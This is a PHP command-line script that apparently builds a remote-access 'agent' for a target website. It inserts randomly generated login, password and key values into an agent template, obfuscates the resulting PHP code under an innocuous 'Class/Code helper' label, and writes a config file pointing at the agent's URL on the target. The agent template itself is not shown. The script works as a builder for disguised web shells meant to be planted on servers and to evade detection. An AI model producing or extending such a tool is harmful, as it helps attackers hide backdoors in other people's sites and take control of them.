<?php
require 'obfuscator/src/Obfuscator.php';
require 'functions.php';

$config_template = './templates/target.json';
$agent_template  = './templates/agent.php';
$output_dir      = './output/';

$options = getopt("u:");
if (!isset($options['u'])) {
    echo " [-] Invalid arguments.\n";
    exit(-1);
}

// Agent filename
$filename = null;
do {
    $line     = readline(" [?] Filename for the agent: ");
    $filename = trim(str_replace(array("\n", "\r"), '', $line));
    if (strlen($filename) == 0) {
        $filename = null;
    }
} while (is_null($filename));


$url = $options['u'];

try {
    $login = random_str(32);
    $password = random_str(32);
    $key = bin2hex(openssl_random_pseudo_bytes(16));
}catch (Exception $e){
    exit($e->getMessage());
}

// Agent content
$data = file_get_contents($agent_template);
$data = str_replace("[KEY_HERE]", $key, $data);
$data = str_replace("[LOGIN_HERE]", $login, $data);
$data = str_replace("[PASSWORD_HERE]", $password, $data);

$agent_file = $output_dir . $filename . '.php';
$agent_filename = $filename;

file_put_contents($agent_file, $data);

unlink($agent_file);

$agent_data      = str_replace(array('<?php', '<?', '?>'), '', $data);
$obfuscated_data = new Obfuscator($agent_data, 'Class/Code helper');
file_put_contents($agent_file, '<?php ' . "\r\n" . $obfuscated_data);

echo " [+] Agent was generated properly.\n";

// Configuration file
$filename = null;
do {
    $line     = readline(" [?] Filename for the config file: ");
    $filename = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if (strlen($filename) == 0) {
        $filename = null;
    }
} while (is_null($filename));

$data = file_get_contents($config_template);
$data = str_replace("[KEY_HERE]", $key, $data);
$data = str_replace("[LOGIN_HERE]", $login, $data);
$data = str_replace("[PASSWORD_HERE]", $password, $data);
$data = str_replace("[URL_HERE]", "{$url}{$agent_filename}.php", $data);
file_put_contents($output_dir . $filename . '.json', $data);
echo " [+] Configuration file was generated properly.\n";

echo "\n\tOpen the output folder :D\n\n";
